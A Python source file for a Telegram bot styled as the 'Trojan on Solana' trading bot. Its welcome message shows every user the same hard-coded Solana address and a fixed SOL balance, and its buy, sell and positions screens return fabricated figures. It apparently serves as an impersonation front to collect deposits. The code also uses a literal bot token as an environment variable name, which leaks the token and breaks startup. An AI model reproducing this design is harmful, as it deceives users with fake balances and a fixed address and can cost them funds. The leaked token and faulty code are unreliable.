import os
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes

# Set up logging to monitor errors and debug information
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# Define the admin Telegram user ID
ADMIN_ID = int(os.getenv("ADMIN_ID", "5698476270"))  # Replace with your Telegram user ID or set via Render

# Define the main menu keyboard
def main_menu_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("Buy", callback_data="buy"),
            InlineKeyboardButton("Sell", callback_data="sell"),
        ],
        [
            InlineKeyboardButton("Positions", callback_data="positions"),
            InlineKeyboardButton("Limit Orders", callback_data="limit_orders"),
        ],
        [
            InlineKeyboardButton("Referrals", callback_data="referrals"),
            InlineKeyboardButton("Withdraw", callback_data="withdraw"),
        ],
        [
            InlineKeyboardButton("Copy Trade", callback_data="copy_trade"),
            InlineKeyboardButton("Settings", callback_data="settings"),
        ],
        [
            InlineKeyboardButton("Admin Page", callback_data="admin_page"),
            InlineKeyboardButton("Help", callback_data="help"),
        ],
    ])

# Admin Page Keyboard with additional options
def admin_page_keyboard():
    return InlineKeyboardMarkup([
        [
            InlineKeyboardButton("User Stats", callback_data="user_stats"),
            InlineKeyboardButton("Bot Activity Logs", callback_data="bot_logs"),
        ],
        [
            InlineKeyboardButton("Database Status", callback_data="db_status"),
            InlineKeyboardButton("Back to Main Menu", callback_data="back_to_main"),
        ],
    ])

# Function to handle the /start command
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    welcome_message = (
        f"Welcome to Trojan on Solana, {update.message.from_user.first_name}!\n\n"
        "Introducing a cutting-edge bot crafted exclusively for Solana Traders. "
        "Trade any token instantly right after launch.\n\n"
        "Solana Address:\n\n"
        "CTbFNi9v996i1Xbrg2QRXjJhXvLPiZAhqaG3HNkMfgat\n"
        "(tap to copy)\n\n"
        "Balance: (2.419) SOL\n\n"
        "Join our Telegram group @trojan for updates and community support!"
    )
    await update.message.reply_text(welcome_message, reply_markup=main_menu_keyboard())

# Function to handle button presses
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    user_id = query.from_user.id
    await query.answer()

    if query.data == "admin_page":
        if user_id == ADMIN_ID:
            admin_message = "Welcome to the Admin Page. Manage bot settings and monitor activities here."
            await query.edit_message_text(admin_message, reply_markup=admin_page_keyboard())
        else:
            logger.warning(f"Unauthorized admin page access attempt by user ID {user_id}.")
            await query.answer("You are not authorized to access this page!", show_alert=True)
            return

    elif query.data == "back_to_main":
        await query.edit_message_text("Returning to main menu...", reply_markup=main_menu_keyboard())

    elif query.data == "buy":
        await query.edit_message_text(
            "Buy $SLND- (Solend) 📈\n\nBalance: -_- SOL\nInsufficient balance for buy amount + gas.",
            reply_markup=main_menu_keyboard()
        )
    elif query.data == "sell":
        await query.edit_message_text(
            "Sell $SLND- (Solend) 📉\n\nBalance: 2.419 SOL\nReady to sell? Confirm the amount.",
            reply_markup=main_menu_keyboard()
        )
    elif query.data == "positions":
        await query.edit_message_text(
            "Current Positions 📊\n\n1. Position 1: $100\n2. Position 2: $200\nTotal: $300",
            reply_markup=main_menu_keyboard()
        )
    elif query.data == "help":
        await query.edit_message_text(
            "Need Help? Contact support or join @trojan for updates.",
            reply_markup=main_menu_keyboard()
        )
    else:
        await query.edit_message_text("Feature not implemented yet.", reply_markup=main_menu_keyboard())

# Function to set up polling or webhook
def run_bot():
    TOKEN = os.getenv("7761108718:AAFmR_1ZtMAXX8DBi_r3BCo7418MtK6C1GU")  # Fetch the bot token from environment variables
    PORT = int(os.getenv("PORT", 8443))  # Render automatically sets this port
    HOSTNAME = os.getenv("RENDER_EXTERNAL_HOSTNAME")  # Render provides this for webhook configuration

    # Set up the application
    application = Application.builder().token(TOKEN).build()

    # Add handlers for commands and button clicks
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button_handler))

    # Start the bot using webhook
    application.run_webhook(
        listen="0.0.0.0",
        port=PORT,
        url_path=TOKEN,
        webhook_url=f"https://{HOSTNAME}/{TOKEN}"
    )

# Entry point of the script
if __name__ == "__main__":
    run_bot()
